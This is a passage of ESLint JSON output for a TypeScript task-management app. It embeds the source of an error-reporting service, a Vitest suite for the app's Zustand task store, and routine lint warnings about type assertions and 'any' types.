this.config.privacyMode \n          ? this.sanitizeStack(errorInfo.componentStack) \n          : errorInfo.componentStack,\n        errorBoundary: context.component\n      } : undefined,\n      context: {\n        userInitiated: false,\n        severity: 'medium',\n        ...context,\n        userInfo: {\n          sessionId: this.sessionId,\n          userAgent: navigator.userAgent,\n          timestamp,\n          ...context.userInfo\n        }\n      },\n      systemInfo: this.collectSystemInfo(),\n      appInfo: this.collectAppInfo()\n    };\n  }\n\n  /**\n   * Send error report to API\n   */\n  private async sendErrorReport(report: ErrorReport): Promise<string | null> {\n    try {\n      if (!this.isOnline) {\n        if (this.config.enableOfflineSupport) {\n          this.queueOfflineReport(report);\n          return report.id;\n        }\n        return null;\n      }\n\n      const response = await fetch(this.config.apiEndpoint, {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n          ...(this.config.apiKey && { 'Authorization': `Bearer ${this.config.apiKey}` })\n        },\n        body: JSON.stringify(report)\n      });\n\n      if (response.ok) {\n        console.debug('Error report sent successfully:', report.id);\n        this.errorCount++;\n        return report.id;\n      } else {\n        console.warn('Failed to send error report:', await response.text());\n        \n        // Queue for retry if offline support is enabled\n        if (this.config.enableOfflineSupport) {\n          this.queueOfflineReport(report);\n          return report.id;\n        }\n      }\n    } catch (error) {\n      console.error('Error sending report:', error);\n      \n      // Queue for retry if offline support is enabled\n      if (this.config.enableOfflineSupport) {\n        this.queueOfflineReport(report);\n        return report.id;\n      }\n    }\n\n    return null;\n  }\n\n  /**\n   * Check if error should be reported\n   */\n  private shouldReportError(error: Error): boolean {\n    // Check session limit\n    if (this.errorCount >= this.config.maxErrorsPerSession) {\n      return false;\n    }\n\n    // Check environment\n    if (!this.config.enabledEnvironments.includes(process.env.NODE_ENV || 'development')) {\n      return false;\n    }\n\n    // Check ignored errors\n    if (this.config.ignoredErrors.some(ignored => \n      error.message.includes(ignored) || error.name.includes(ignored)\n    )) {\n      return false;\n    }\n\n    return true;\n  }\n\n  /**\n   * Collect system information\n   */\n  private collectSystemInfo() {\n    const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;\n    \n    return {\n      userAgent: navigator.userAgent,\n      platform: navigator.platform,\n      language: navigator.language,\n      screenSize: `${screen.width}x${screen.height}`,\n      url: window.location.href,\n      viewport: `${window.innerWidth}x${window.innerHeight}`,\n      memory: (performance as any).memory?.usedJSHeapSize,\n      connection: connection?.effectiveType || 'unknown'\n    };\n  }\n\n  /**\n   * Collect application information\n   */\n  private collectAppInfo() {\n    return {\n      version: process.env.REACT_APP_VERSION || '1.0.0',\n      environment: process.env.NODE_ENV || 'development',\n      buildId: process.env.REACT_APP_BUILD_ID,\n      feature: window.location.pathname\n    };\n  }\n\n  /**\n   * Set up network detection\n   */\n  private setupNetworkDetection(): void {\n    window.addEventListener('online', () => {\n      this.isOnline = true;\n      this.processOfflineQueue();\n    });\n\n    window.addEventListener('offline', () => {\n      this.isOnline = false;\n    });\n  }\n\n  /**\n   * Set up global error handlers\n   */\n  private setupGlobalErrorHandlers(): void {\n    // Handle unhandled errors\n    window.addEventListener('error', (event) => {\n      this.reportError(event.error || new Error(event.message), undefined, {\n        component: 'GlobalErrorHandler',\n        action: 'unhandled_error',\n        severity: 'high'\n      });\n    });\n\n    // Handle unhandled promise rejections\n    window.addEventListener('unhandledrejection', (event) => {\n      const error = event.reason instanceof Error \n        ? event.reason \n        : new Error(`Unhandled Promise Rejection: ${event.reason}`);\n        \n      this.reportError(error, undefined, {\n        component: 'GlobalErrorHandler',\n        action: 'unhandled_promise_rejection',\n        severity: 'medium'\n      });\n    });\n  }\n\n  /**\n   * Process offline queue\n   */\n  private async processOfflineQueue(): Promise<void> {\n    if (!this.isOnline || this.offlineQueue.length === 0) {\n      return;\n    }\n\n    const reports = [...this.offlineQueue];\n    this.offlineQueue = [];\n\n    for (const report of reports) {\n      try {\n        await this.sendErrorReport(report);\n      } catch (error) {\n        console.warn('Failed to send queued report:', error);\n        // Re-queue if still failing\n        this.offlineQueue.push(report);\n      }\n    }\n\n    // Persist updated queue\n    this.persistOfflineQueue();\n  }\n\n  /**\n   * Queue report for offline processing\n   */\n  private queueOfflineReport(report: ErrorReport): void {\n    this.offlineQueue.push(report);\n    this.persistOfflineQueue();\n  }\n\n  /**\n   * Queue feedback for offline processing\n   */\n  private queueOfflineFeedback(feedback: UserFeedback): void {\n    const key = 'errorReporting_offlineFeedback';\n    try {\n      const existing = JSON.parse(localStorage.getItem(key) || '[]');\n      existing.push(feedback);\n      localStorage.setItem(key, JSON.stringify(existing));\n    } catch (error) {\n      console.warn('Failed to queue offline feedback:', error);\n    }\n  }\n\n  /**\n   * Persist offline queue to localStorage\n   */\n  private persistOfflineQueue(): void {\n    try {\n      localStorage.setItem('errorReporting_offlineQueue', JSON.stringify(this.offlineQueue));\n    } catch (error) {\n      console.warn('Failed to persist offline queue:', error);\n    }\n  }\n\n  /**\n   * Load offline queue from localStorage\n   */\n  private loadOfflineQueue(): void {\n    try {\n      const stored = localStorage.getItem('errorReporting_offlineQueue');\n      if (stored) {\n        this.offlineQueue = JSON.parse(stored);\n      }\n    } catch (error) {\n      console.warn('Failed to load offline queue:', error);\n      this.offlineQueue = [];\n    }\n  }\n\n  /**\n   * Generate unique report ID\n   */\n  private generateReportId(): string {\n    return `err_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Generate session ID\n   */\n  private generateSessionId(): string {\n    return `sess_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n  }\n\n  /**\n   * Sanitize stack traces for privacy\n   */\n  private sanitizeStack(stack?: string): string | undefined {\n    if (!stack) return undefined;\n    \n    // Remove file paths and replace with generic indicators\n    return stack\n      .replace(/https?:\\/\\/[^\\s)]+/g, '[URL]')\n      .replace(/file:\\/\\/[^\\s)]+/g, '[FILE]')\n      .replace(/webpack-internal:\\/\\/[^\\s)]+/g, '[WEBPACK]')\n      .replace(/at [^\\s]+ \\([^)]+\\)/g, 'at [FUNCTION] ([LOCATION])');\n  }\n\n  /**\n   * Log error report to console (development)\n   */\n  private logErrorReport(report: ErrorReport): void {\n    console.group('ðŸ› Error Report');\n    console.error('Error:', report.error);\n    console.log('Context:', report.context);\n    console.log('System Info:', report.systemInfo);\n    console.log('App Info:', report.appInfo);\n    if (report.errorInfo) {\n      console.log('Component Stack:', report.errorInfo.componentStack);\n    }\n    console.groupEnd();\n  }\n\n  /**\n   * Get public configuration (for debugging)\n   */\n  private getPublicConfig() {\n    const { apiKey, ...publicConfig } = this.config;\n    return {\n      ...publicConfig,\n      apiKey: apiKey ? '[CONFIGURED]' : '[NOT_SET]'\n    };\n  }\n\n  /**\n   * Get session statistics\n   */\n  getSessionStats() {\n    return {\n      sessionId: this.sessionId,\n      errorCount: this.errorCount,\n      pendingReports: this.pendingReports.length,\n      offlineQueueSize: this.offlineQueue.length,\n      isOnline: this.isOnline\n    };\n  }\n\n  /**\n   * Clear session data (useful for testing)\n   */\n  clearSession(): void {\n    this.errorCount = 0;\n    this.pendingReports = [];\n    this.offlineQueue = [];\n    this.sessionId = this.generateSessionId();\n    \n    try {\n      localStorage.removeItem('errorReporting_offlineQueue');\n      localStorage.removeItem('errorReporting_offlineFeedback');\n    } catch (error) {\n      console.warn('Failed to clear session data:', error);\n    }\n  }\n}\n\n// Create singleton instance\nexport const errorReportingService = new ErrorReportingService();\n\n// Export service class for custom instances\nexport { ErrorReportingService };\n\n// Types are already exported as interfaces above","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/__tests__/errorHandling.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/__tests__/useTaskStore.test.ts","messages":[{"ruleId":"@typescript-eslint/no-non-null-asserted-optional-chain","severity":2,"message":"Optional chain expressions can return undefined by design - using a non-null assertion is unsafe and wrong.","line":218,"column":25,"nodeType":"TSNonNullExpression","messageId":"noNonNullOptionalChain","endLine":218,"endColumn":52,"suggestions":[{"messageId":"suggestRemovingNonNull","fix":{"range":[5751,5752],"text":""},"desc":"You should remove the non-null assertion."}]},{"ruleId":"@typescript-eslint/no-non-null-asserted-optional-chain","severity":2,"message":"Optional chain expressions can return undefined by design - using a non-null assertion is unsafe and wrong.","line":251,"column":25,"nodeType":"TSNonNullExpression","messageId":"noNonNullOptionalChain","endLine":251,"endColumn":52,"suggestions":[{"messageId":"suggestRemovingNonNull","fix":{"range":[6652,6653],"text":""},"desc":"You should remove the non-null assertion."}]}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Core Task Store Tests (2025)\n * \n * Comprehensive test suite for the main Zustand task store,\n * covering CRUD operations, state management, and store integrations.\n * \n * Following 2025 patterns for state management testing.\n */\n\nimport { describe, it, expect, beforeEach, vi } from 'vitest';\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { act, renderHook } from '@testing-library/react';\nimport { useTaskStore } from '../useTaskStore';\nimport { testUtils } from '@tests/setup';\nimport type { Task, ViewMode, UserSettings } from '@/types';\n\n// Mock analytics generation\nvi.mock('@/lib/utils', () => ({\n  generateAnalytics: vi.fn(() => ({\n    totalTasks: 0,\n    completedTasks: 0,\n    inProgressTasks: 0,\n    pendingTasks: 0,\n    completionRate: 0,\n    averageCompletionTime: 0,\n    tasksByPriority: { low: 0, medium: 0, high: 0 },\n    tasksByStatus: { \n      pending: 0, \n      'in-progress': 0, \n      done: 0, \n      review: 0, \n      deferred: 0, \n      cancelled: 0 \n    },\n    velocityMetrics: { \n      tasksCompletedLastWeek: 0, \n      tasksCompletedThisWeek: 0, \n      trend: 'stable' \n    },\n    burndownData: []\n  })),\n  generateId: vi.fn(() => Math.floor(Math.random() * 1000000))\n}));\n\ndescribe('useTaskStore', () => {\n  beforeEach(() => {\n    // Reset store to initial state\n    act(() => {\n      useTaskStore.getState().resetStore();\n    });\n  });\n\n  describe('Task CRUD Operations', () => {\n    it('should add a task successfully', () => {\n      const store = useTaskStore.getState();\n      const mockTask = testUtils.createMockTask({\n        title: 'New Task',\n        description: 'Test task creation'\n      });\n\n      act(() => {\n        store.addTask(mockTask);\n      });\n\n      const tasks = store.tasks;\n      expect(tasks).toHaveLength(1);\n      expect(tasks[0]).toMatchObject({\n        title: 'New Task',\n        description: 'Test task creation',\n        status: 'pending',\n        priority: 'medium'\n      });\n      expect(tasks[0].id).toBeDefined();\n      expect(tasks[0].createdAt).toBeDefined();\n      expect(tasks[0].updatedAt).toBeDefined();\n    });\n\n    it('should update a task successfully', () => {\n      const store = useTaskStore.getState();\n      const mockTask = testUtils.createMockTask();\n\n      // Add task first\n      act(() => {\n        store.addTask(mockTask);\n      });\n\n      const taskId = store.tasks[0].id;\n\n      // Update the task\n      act(() => {\n        store.updateTask(taskId, {\n          title: 'Updated Title',\n          status: 'in-progress',\n          priority: 'high'\n        });\n      });\n\n      const updatedTask = store.getTaskById(taskId);\n      expect(updatedTask).toMatchObject({\n        title: 'Updated Title',\n        status: 'in-progress',\n        priority: 'high'\n      });\n      expect(updatedTask?.updatedAt).not.toBe(mockTask.updatedAt);\n    });\n\n    it('should delete a task successfully', () => {\n      const store = useTaskStore.getState();\n      const mockTask = testUtils.createMockTask();\n\n      // Add task first\n      act(() => {\n        store.addTask(mockTask);\n      });\n\n      expect(store.tasks).toHaveLength(1);\n      const taskId = store.tasks[0].id;\n\n      // Delete the task\n      act(() => {\n        store.deleteTask(taskId);\n      });\n\n      expect(store.tasks).toHaveLength(0);\n      expect(store.getTaskById(taskId)).toBeUndefined();\n    });\n\n    it('should duplicate a task with new ID', () => {\n      const store = useTaskStore.getState();\n      const mockTask = testUtils.createMockTask({\n        title: 'Original Task'\n      });\n\n      // Add task first\n      act(() => {\n        store.addTask(mockTask);\n      });\n\n      const originalId = store.tasks[0].id;\n\n      // Duplicate the task\n      act(() => {\n        store.duplicateTask(originalId);\n      });\n\n      expect(store.tasks).toHaveLength(2);\n      const duplicatedTask = store.tasks.find(t => t.id !== originalId);\n      \n      expect(duplicatedTask).toBeDefined();\n      expect(duplicatedTask?.title).toBe('Original Task (Copy)');\n      expect(duplicatedTask?.id).not.toBe(originalId);\n      expect(duplicatedTask?.createdAt).not.toBe(store.tasks[0].createdAt);\n    });\n  });\n\n  describe('Subtask Operations', () => {\n    let parentTaskId: number;\n\n    beforeEach(() => {\n      const store = useTaskStore.getState();\n      const parentTask = testUtils.createMockTask({\n        title: 'Parent Task'\n      });\n\n      act(() => {\n        store.addTask(parentTask);\n      });\n\n      parentTaskId = store.tasks[0].id;\n    });\n\n    it('should add a subtask to a parent task', () => {\n      const store = useTaskStore.getState();\n      const subtask = {\n        title: 'Subtask 1',\n        description: 'First subtask',\n        status: 'pending' as const,\n        priority: 'low' as const\n      };\n\n      act(() => {\n        store.addSubtask(parentTaskId, subtask);\n      });\n\n      const parentTask = store.getTaskById(parentTaskId);\n      expect(parentTask?.subtasks).toHaveLength(1);\n      expect(parentTask?.subtasks[0]).toMatchObject(subtask);\n      expect(parentTask?.subtasks[0].id).toBeDefined();\n    });\n\n    it('should update a subtask', () => {\n      const store = useTaskStore.getState();\n\n      // Add subtask first\n      act(() => {\n        store.addSubtask(parentTaskId, {\n          title: 'Original Subtask',\n          description: 'Original description',\n          status: 'pending',\n          priority: 'low'\n        });\n      });\n\n      const parentTask = store.getTaskById(parentTaskId);\n      const subtaskId = parentTask?.subtasks[0].id!;\n\n      // Update subtask\n      act(() => {\n        store.updateSubtask(parentTaskId, subtaskId, {\n          title: 'Updated Subtask',\n          status: 'done'\n        });\n      });\n\n      const updatedParent = store.getTaskById(parentTaskId);\n      const updatedSubtask = updatedParent?.subtasks.find(s => s.id === subtaskId);\n      \n      expect(updatedSubtask).toMatchObject({\n        title: 'Updated Subtask',\n        status: 'done'\n      });\n    });\n\n    it('should delete a subtask', () => {\n      const store = useTaskStore.getState();\n\n      // Add subtask first\n      act(() => {\n        store.addSubtask(parentTaskId, {\n          title: 'Subtask to Delete',\n          description: 'Will be deleted',\n          status: 'pending',\n          priority: 'medium'\n        });\n      });\n\n      const parentTask = store.getTaskById(parentTaskId);\n      const subtaskId = parentTask?.subtasks[0].id!;\n\n      expect(parentTask?.subtasks).toHaveLength(1);\n\n      // Delete subtask\n      act(() => {\n        store.deleteSubtask(parentTaskId, subtaskId);\n      });\n\n      const updatedParent = store.getTaskById(parentTaskId);\n      expect(updatedParent?.subtasks).toHaveLength(0);\n    });\n  });\n\n  describe('Filtering and Querying', () => {\n    beforeEach(() => {\n      const store = useTaskStore.getState();\n      \n      // Add sample tasks with different properties\n      const tasks = [\n        testUtils.createMockTask({ \n          title: 'High Priority Task', \n          priority: 'high', \n          status: 'pending' \n        }),\n        testUtils.createMockTask({ \n          title: 'Completed Task', \n          priority: 'medium', \n          status: 'done' \n        }),\n        testUtils.createMockTask({ \n          title: 'In Progress Task', \n          priority: 'low', \n          status: 'in-progress' \n        })\n      ];\n\n      act(() => {\n        tasks.forEach(task => store.addTask(task));\n      });\n    });\n\n    it('should filter tasks by status', () => {\n      const store = useTaskStore.getState();\n      \n      const pendingTasks = store.getTasksByStatus('pending');\n      const completedTasks = store.getTasksByStatus('done');\n      const inProgressTasks = store.getTasksByStatus('in-progress');\n\n      expect(pendingTasks).toHaveLength(1);\n      expect(pendingTasks[0].title).toBe('High Priority Task');\n      \n      expect(completedTasks).toHaveLength(1);\n      expect(completedTasks[0].title).toBe('Completed Task');\n      \n      expect(inProgressTasks).toHaveLength(1);\n      expect(inProgressTasks[0].title).toBe('In Progress Task');\n    });\n\n    it('should filter tasks by priority', () => {\n      const store = useTaskStore.getState();\n      \n      const highPriorityTasks = store.getTasksByPriority('high');\n      const mediumPriorityTasks = store.getTasksByPriority('medium');\n      const lowPriorityTasks = store.getTasksByPriority('low');\n\n      expect(highPriorityTasks).toHaveLength(1);\n      expect(mediumPriorityTasks).toHaveLength(1);\n      expect(lowPriorityTasks).toHaveLength(1);\n    });\n\n    it('should apply search query filter', () => {\n      const store = useTaskStore.getState();\n\n      act(() => {\n        store.setSearchQuery('High Priority');\n      });\n\n      const filteredTasks = store.getFilteredTasks();\n      expect(filteredTasks).toHaveLength(1);\n      expect(filteredTasks[0].title).toBe('High Priority Task');\n    });\n\n    it('should combine multiple filters', () => {\n      const store = useTaskStore.getState();\n\n      act(() => {\n        store.setFilters({\n          status: ['pending'],\n          priority: ['high']\n        });\n      });\n\n      const filteredTasks = store.getFilteredTasks();\n      expect(filteredTasks).toHaveLength(1);\n      expect(filteredTasks[0].title).toBe('High Priority Task');\n    });\n  });\n\n  describe('View Mode Management', () => {\n    it('should set view mode correctly', () => {\n      const store = useTaskStore.getState();\n      \n      const newViewMode: ViewMode = {\n        type: 'kanban',\n        density: 'compact',\n        groupBy: 'priority',\n        sortBy: 'title',\n        sortOrder: 'desc'\n      };\n\n      act(() => {\n        store.setViewMode(newViewMode);\n      });\n\n      expect(store.viewMode).toEqual(newViewMode);\n    });\n\n    it('should toggle sidebar collapsed state', () => {\n      const store = useTaskStore.getState();\n      \n      expect(store.sidebarCollapsed).toBe(false);\n\n      act(() => {\n        store.setSidebarCollapsed(true);\n      });\n\n      expect(store.sidebarCollapsed).toBe(true);\n    });\n  });\n\n  describe('User Settings Management', () => {\n    it('should update user settings', () => {\n      const store = useTaskStore.getState();\n      \n      const newSettings = testUtils.createMockUserSettings({\n        ui: { theme: 'dark', density: 'compact' },\n        notifications: { enabled: false }\n      });\n\n      act(() => {\n        store.setUserSettings(newSettings);\n      });\n\n      expect(store.userSettings).toEqual(newSettings);\n    });\n  });\n\n  describe('Bulk Operations', () => {\n    beforeEach(() => {\n      const store = useTaskStore.getState();\n      \n      // Add multiple tasks\n      const tasks = Array.from({ length: 5 }, (_, i) => \n        testUtils.createMockTask({ \n          title: `Task ${i + 1}`,\n          status: i % 2 === 0 ? 'pending' : 'done'\n        })\n      );\n\n      act(() => {\n        tasks.forEach(task => store.addTask(task));\n      });\n    });\n\n    it('should update multiple tasks at once', () => {\n      const store = useTaskStore.getState();\n      const taskIds = store.tasks.slice(0, 3).map(t => t.id);\n\n      act(() => {\n        store.updateMultipleTasks(taskIds, { priority: 'high' });\n      });\n\n      const updatedTasks = taskIds.map(id => store.getTaskById(id));\n      updatedTasks.forEach(task => {\n        expect(task?.priority).toBe('high');\n      });\n    });\n\n    it('should delete multiple tasks at once', () => {\n      const store = useTaskStore.getState();\n      const initialCount = store.tasks.length;\n      const taskIds = store.tasks.slice(0, 2).map(t => t.id);\n\n      act(() => {\n        store.deleteMultipleTasks(taskIds);\n      });\n\n      expect(store.tasks).toHaveLength(initialCount - 2);\n      taskIds.forEach(id => {\n        expect(store.getTaskById(id)).toBeUndefined();\n      });\n    });\n  });\n\n  describe('Data Import/Export', () => {\n    it('should export tasks to JSON format', () => {\n      const store = useTaskStore.getState();\n      \n      // Add sample tasks\n      act(() => {\n        store.addTask(testUtils.createMockTask({ title: 'Export Test 1' }));\n        store.addTask(testUtils.createMockTask({ title: 'Export Test 2' }));\n      });\n\n      const exportData = store.exportToJSON();\n      \n      expect(exportData).toHaveProperty('tasks');\n      expect(exportData.tasks).toHaveLength(2);\n      expect(exportData.tasks[0].title).toBe('Export Test 1');\n      expect(exportData.tasks[1].title).toBe('Export Test 2');\n    });\n\n    it('should import tasks from JSON format', () => {\n      const store = useTaskStore.getState();\n      \n      const importData = {\n        tasks: [\n          testUtils.createMockTask({ title: 'Imported Task 1' }),\n          testUtils.createMockTask({ title: 'Imported Task 2' })\n        ]\n      };\n\n      act(() => {\n        store.loadFromJSON(importData);\n      });\n\n      expect(store.tasks).toHaveLength(2);\n      expect(store.tasks[0].title).toBe('Imported Task 1');\n      expect(store.tasks[1].title).toBe('Imported Task 2');\n    });\n\n    it('should reset store to initial state', () => {\n      const store = useTaskStore.getState();\n      \n      // Add some data\n      act(() => {\n        store.addTask(testUtils.createMockTask());\n        store.setSearchQuery('test');\n        store.setSelectedTask(1);\n      });\n\n      expect(store.tasks).toHaveLength(1);\n      expect(store.searchQuery).toBe('test');\n      expect(store.selectedTask).toBe(1);\n\n      // Reset store\n      act(() => {\n        store.resetStore();\n      });\n\n      expect(store.tasks).toHaveLength(0);\n      expect(store.searchQuery).toBe('');\n      expect(store.selectedTask).toBeNull();\n    });\n  });\n\n  describe('Dependencies and Relationships', () => {\n    let taskIds: number[];\n\n    beforeEach(() => {\n      const store = useTaskStore.getState();\n      \n      // Create tasks with dependencies\n      const tasks = [\n        testUtils.createMockTask({ title: 'Task A', dependencies: [] }),\n        testUtils.createMockTask({ title: 'Task B', dependencies: [] }),\n        testUtils.createMockTask({ title: 'Task C', dependencies: [] })\n      ];\n\n      act(() => {\n        tasks.forEach(task => store.addTask(task));\n      });\n\n      taskIds = store.tasks.map(t => t.id);\n    });\n\n    it('should find dependent tasks', () => {\n      const store = useTaskStore.getState();\n      \n      // Make Task B depend on Task A\n      act(() => {\n        store.updateTask(taskIds[1], { dependencies: [taskIds[0]] });\n      });\n\n      const dependentTasks = store.getDependentTasks(taskIds[0]);\n      expect(dependentTasks).toHaveLength(1);\n      expect(dependentTasks[0].title).toBe('Task B');\n    });\n\n    it('should find blocking tasks', () => {\n      const store = useTaskStore.getState();\n      \n      // Make Task B depend on Task A\n      act(() => {\n        store.updateTask(taskIds[1], { dependencies: [taskIds[0]] });\n      });\n\n      const blockingTasks = store.getBlockingTasks(taskIds[1]);\n      expect(blockingTasks).toHaveLength(1);\n      expect(blockingTasks[0].title).toBe('Task A');\n    });\n  });\n\n  describe('Performance and Reactivity', () => {\n    it('should handle large numbers of tasks efficiently', () => {\n      const store = useTaskStore.getState();\n      const startTime = performance.now();\n      \n      // Add many tasks\n      act(() => {\n        for (let i = 0; i < 1000; i++) {\n          store.addTask(testUtils.createMockTask({ \n            title: `Performance Test Task ${i}`\n          }));\n        }\n      });\n      \n      const endTime = performance.now();\n      const duration = endTime - startTime;\n      \n      expect(store.tasks).toHaveLength(1000);\n      expect(duration).toBeLessThan(1000); // Should complete in under 1 second\n    });\n\n    it('should update analytics when tasks change', () => {\n      const store = useTaskStore.getState();\n      \n      // Add tasks with different statuses\n      act(() => {\n        store.addTask(testUtils.createMockTask({ status: 'pending' }));\n        store.addTask(testUtils.createMockTask({ status: 'done' }));\n        store.addTask(testUtils.createMockTask({ status: 'in-progress' }));\n      });\n\n      const analytics = store.analytics;\n      expect(analytics.totalTasks).toBe(3);\n      expect(analytics.tasksByStatus.pending).toBe(1);\n      expect(analytics.tasksByStatus.done).toBe(1);\n      expect(analytics.tasksByStatus['in-progress']).toBe(1);\n    });\n  });\n\n  describe('Hook Integration', () => {\n    it('should work correctly with renderHook', () => {\n      const { result } = renderHook(() => useTaskStore());\n      \n      expect(result.current.tasks).toEqual([]);\n      expect(typeof result.current.addTask).toBe('function');\n      \n      const mockTask = testUtils.createMockTask();\n      \n      act(() => {\n        result.current.addTask(mockTask);\n      });\n      \n      expect(result.current.tasks).toHaveLength(1);\n    });\n\n    it('should trigger re-renders when state changes', () => {\n      let renderCount = 0;\n      \n      const { result } = renderHook(() => {\n        renderCount++;\n        return useTaskStore(state => state.tasks.length);\n      });\n      \n      expect(renderCount).toBe(1);\n      expect(result.current).toBe(0);\n      \n      act(() => {\n        useTaskStore.getState().addTask(testUtils.createMockTask());\n      });\n      \n      expect(renderCount).toBe(2);\n      expect(result.current).toBe(1);\n    });\n  });\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/backupService.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":28,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":28,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[795,798],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[795,798],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":28,"column":89,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":28,"endColumn":92,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[843,846],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[843,846],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":32,"column":27,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":32,"endColumn":30,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[940,943],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[940,943],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":33,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":33,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[990,993],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[990,993],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":63,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":63,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2022,2025],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2022,2025],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":75,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":75,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2464,2467],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2464,2467],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":128,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":128,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4254,4257],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4254,4257],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":136,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":136,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4490,4493],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4490,4493],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":170,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":170,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5402,5405],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5402,5405],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":183,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":183,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[5782,5785],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[5782,5785],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":282,"column":48,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":282,"endColumn":51,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8443,8446],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8443,8446],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console 